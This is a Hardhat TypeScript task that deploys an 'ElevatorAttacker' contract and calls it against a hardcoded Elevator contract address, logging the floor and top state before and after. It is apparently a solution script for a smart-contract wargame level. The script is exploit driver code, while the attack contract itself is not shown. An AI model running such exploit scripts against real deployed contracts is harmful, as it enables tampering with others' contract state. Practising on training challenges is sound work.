import { task } from 'hardhat/config';
import { TaskArguments } from 'hardhat/types';

import { ElevatorAttacker } from '../../src/types';
import { deploy, logTransaction } from './utils';

const TARGET = '0xA98fB437AC704451e3A0789D7781379ad51c0A91';

task('deploy:Elevator').setAction(async function (_: TaskArguments, hre) {
  const { ethers } = hre;
  const [attacker] = await ethers.getSigners();

  const elevator = await hre.ethers.getContractAt('Elevator', TARGET);
  if (!elevator || !TARGET) {
    throw new Error('missing params');
  }
  const logStatus = async (label = 'Before') => {
    console.log(
      `[${label}] floor: ${(
        await elevator.floor()
      ).toString()} | top: ${await elevator.top()}`,
    );
  };
  const elevatorAttacker = await deploy<ElevatorAttacker>(
    hre,
    'ElevatorAttacker',
    attacker,
  );

  await logStatus('Before');
  await logTransaction(() =>
    elevatorAttacker.connect(attacker).execute(TARGET, 9001),
  );
  await logStatus('After');
});
